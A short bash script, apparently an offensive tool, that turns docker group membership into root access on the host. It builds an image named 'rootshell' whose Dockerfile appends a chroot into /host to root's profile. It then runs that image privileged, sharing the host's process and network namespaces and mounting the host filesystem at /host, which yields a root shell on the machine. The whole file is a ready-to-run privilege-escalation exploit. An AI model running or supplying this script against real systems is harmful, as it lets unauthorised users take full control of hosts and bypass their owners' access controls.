#!/bin/bash

if ! id | grep -q docker; then echo "$LOGNAME is not a member of the docker group."; exit; fi
images="$(docker images | awk '{print $1}' | awk 'NR>1')"
echo -e "\n${images}\n"
read -r -p 'Please type the name of the image you want to use: ' IMAGE
read -r -d '' DOCKERFILE <<EOF
FROM $IMAGE
RUN echo "\$(which chroot) /host /bin/sh" >> /root/.profile
ENTRYPOINT ["/bin/sh", "-l"]
EOF
echo "$DOCKERFILE" > Dockerfile
docker rmi rootshell >/dev/null 2>&1
docker build -t rootshell .
docker run --rm --privileged --pid=host --net=host -itv /:/host rootshell
docker rmi rootshell
rm -f Dockerfile
